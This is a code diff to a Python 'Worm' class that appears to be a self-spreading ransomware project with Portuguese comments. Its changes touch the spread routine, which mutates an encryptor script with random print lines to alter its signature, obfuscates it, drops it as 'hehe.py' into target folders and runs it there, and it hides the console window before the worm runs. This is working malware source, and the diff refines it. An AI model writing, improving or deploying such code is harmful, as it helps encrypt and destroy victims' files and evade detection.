@@ -2,7 +2,6 @@ import os
 os.system("pip install pypiwin32 pyinstaller pycryptodome cryptography > /dev/null 2>&1") # /dev/null 2>&1 -> esconder o output
 import sys
 import time
-import shutil
 import win32con
 import win32gui
 import random
@@ -35,6 +34,11 @@ class Worm:
         self.directories_found = True
 
     def spread(self):
+        if not os.path.exists(THIS_DIR + "\\tmp"):
+            os.mkdir(THIS_DIR + "\\tmp")
+
+        to_infect = THIS_DIR + "\\tmp\\to_infect.py"
+        to_infect_o = THIS_DIR + "\\tmp\\to_infect_o.py"
         with open(ENCRYPTOR_PATH, "r") as f:
             encryptor = f.read()
 
@@ -44,15 +48,15 @@ class Worm:
                 num = random.randrange(-sys.maxsize, sys.maxsize)
                 encryptor = "print(" + str(num) + ")\n" + encryptor
 
-            with open("to_infect.py", "w") as tf:
+            with open(to_infect, "w") as tf:
                 tf.write(encryptor)
 
-            os.system("python.exe ./py_fuscate.py -i to_infect.py -o to_infect_o.py -c 100")
+            os.system(f"python.exe ./py_fuscate.py -i {to_infect} -o {to_infect_o} -c 100")
 
             count = 0
             try:
                 with open(target + "/hehe.py", "w") as f:
-                    with open("to_infect_o.py", "r") as fe:
+                    with open(to_infect_o, "r") as fe:
                         f.write(fe.read())
                 os.system("cd " + target + " && python.exe hehe.py && cd " + THIS_DIR)
                 os.remove(target + "/hehe.py")
@@ -61,7 +65,7 @@ class Worm:
 
     def decrypt_files(self):
         count = 0
-        for target in ["C:\\Users\\w0rmer\\Downloads\\test", "C:\\Users\\w0rmer\\Downloads\\test2"]:
+        for target in ["C:\\Users\\w0rmer\\Downloads\\test\\", "C:\\Users\\w0rmer\\Downloads\\test2\\"]:
             try:
                 for (_, _, filenames) in os.walk(target):
                     break
@@ -136,7 +140,7 @@ if __name__ == "__main__":
                 hide = win32gui.GetForegroundWindow()
                 win32gui.ShowWindow(hide, win32con.SW_HIDE)
                 worm.execute_worm()
-                sys.exit(0)
+                break
             case 4: # desencriptar ficheiros
                 print("[+] Decrypting files!")
                 worm.decrypt_files()
@@ -149,3 +153,5 @@ if __name__ == "__main__":
             case _:
                 print("[!] Invalid Option.")
                 print("[!] Try again...")
+    if os.path.exists(THIS_DIR + "\\tmp"):
+        os.rmdir("tmp")
